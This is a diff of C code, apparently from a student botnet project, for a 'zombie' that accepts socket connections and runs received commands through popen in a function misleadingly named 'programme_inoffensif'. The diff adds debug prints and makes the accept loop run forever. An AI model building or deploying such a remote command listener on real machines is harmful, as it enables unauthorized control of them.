@@ -9,21 +9,22 @@
 #include "info.h"
 #include "reseau.h"
 
-volatile sig_atomic_t end = 0;
-
+/*
 void EndZombieHandler(int num){
     end = 1;
-}
+}*/
 
 char* programme_inoffensif(char* commande) 
 {
     char* rep = malloc(100 * sizeof(char));
-
+    printf("%d porttt", PORTS[0]);
+    printf("%d porttt", NUM_PORTS);
     FILE* fp = popen(commande, "r");
     if (fp == NULL) {
         perror("Erreur lors de l'exécution de la commande");
         return NULL;
     }
+
 
     // Lecture réponse 
     fgets(rep, 100, fp);
@@ -45,8 +46,9 @@ int main(int argc, char *argv[]){
     int sockfd = initSocketZombie();
 
     int newsockfd;
-
-    while(!end){
+    
+    /*while(!end){*/
+    while(true){
         // attend une connexion
         printf("En attente de connexion\n");
         newsockfd = saccept(sockfd);
